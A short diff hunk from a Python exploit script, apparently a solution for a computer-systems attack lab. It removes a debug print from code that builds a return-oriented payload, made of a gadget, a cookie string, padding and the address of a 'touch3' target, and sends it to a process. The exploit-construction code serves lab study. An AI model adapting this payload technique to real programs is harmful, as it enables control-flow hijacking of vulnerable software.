@@ -53,7 +53,6 @@ junk = "a" * (junk_size - len(pop_rdi_ret) - len(cookie_str))
 cookie_str_addr = input_buf_addr + len(pop_rdi_ret)
 payload = pop_rdi_ret + cookie_str + junk + set_p64(input_buf_addr) + set_p64(cookie_str_addr) + set_p64(touch3)
 
-print(payload)
 
 p.sendline(payload)
 print(str(p.recv(), "ascii"))
